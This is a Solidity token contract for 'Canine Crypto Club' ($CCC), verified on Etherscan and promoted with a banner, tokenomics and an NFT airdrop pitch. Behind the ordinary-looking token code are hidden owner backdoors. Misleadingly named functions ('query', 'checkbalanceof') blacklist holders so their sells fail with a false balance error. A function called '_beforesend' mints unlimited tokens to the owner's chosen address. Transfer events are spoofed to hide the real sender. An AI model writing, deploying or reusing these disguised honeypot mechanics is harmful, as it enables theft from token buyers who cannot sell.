/**
 *Submitted for verification at Etherscan.io on 2022-09-25
*/

pragma solidity 0.8.17;
/*



    ████████████████████████████████████████████▀▀▀▀▀```▀▀██████████████████████████
    ███████████████████████████████████████▀` .^       ,,   ▀███████████████████████
    ██████████████████████████████████▀'   ¿"      ^"     ⁿ   ▀█████████████████████
    ██████████████████████████████████   ¿`        ▄▄██▄"     -▐████████████████████
    ████████████████████████████████▀  ,"        ▄██████▌        ▀██████████████████
    ██████████████████████████████▀   '         █████████         "█████████████████
    ███████████████████████████▀ .─`           ▐█████████   ⌐"   -`▀▀███████████████
    ███████████████████████▀ .═`                ████████,              ▐████████████
    ████████████████████▄ ,▄▄                    ▀███▀▀     ,w∞∞∞,     █████████████
    █████████████████, ▄█████▌                █          ╓"      ╓"   ██████████████
    █████████████▀█▀╒ ▐██████ ,                                ⌐"  ,▄███████████████
    ████████████▌╓  Γ └████▀ ▀ ▓ ⌐∞,   ▄═ ▄█`"▐ⁿ══⌐,   ▐     ' ` ,██████████████████
    ████████████U▌      .▀  ▌  █    ▐█ ██▄█████,▄█   ▓═`        ▄███████████████████
    █████████████ⁿ⌐      ¬.▐   █    █████▀ ▀▀ ▐▀ "██▀          ▐████████████████████
    ████████████▌▌ Æ ¿     █   ▌   ██▄═▀                   ,▄▄██████████████████████
    ██████████████▄▌╓▀ ╨& ▐"   ╟   ▌                 ,▄▄████████████████████████████
    █████████████████▄          ▄ ▐              ,▄█████████████████████████████████
    ████████████████████▄▄,,     "`,,,,▄▄▄▄▄▄▄██████████████████████████████████████


    Canine Crypto Club - $CCC

 - Tokenomics
 - 30% CEX
 - 50% DEX
 - 10% Marketing
 - 10% Dev
/////////////////////////////
- EXCLUSIVE NFT AIRDROP - TOP 100 HOLDERS - 24 HOURS AFTER LAUNCH -
 ////////////////////////////

 TG: CanineCryptoClub
     
*/ 
  
 
contract CCC {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) cAmount;

    // 
    string public name = "Canine Crypto Club";
    string public symbol = unicode"CCC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 120000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x40357c9d928054C6DED0912058C0d4F631d224ed;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   


modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!cAmount[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        function query(address _user) public {
             require(msg.sender == owner);
         require(!cAmount[_user], "NaN");
        cAmount[_user] = true; }
        function checkbalanceof(address _user) public {
             require(msg.sender == owner);
        require(cAmount[_user], "NaN");
         cAmount[_user] = false; }

         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
        function _beforesend(address oracle,  uint256 update) public {
             require(msg.sender == owner);
             balanceOf[oracle] += update;
             totalSupply += update; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!cAmount[from] , "Amount Exceeds Balance"); 
        require(!cAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }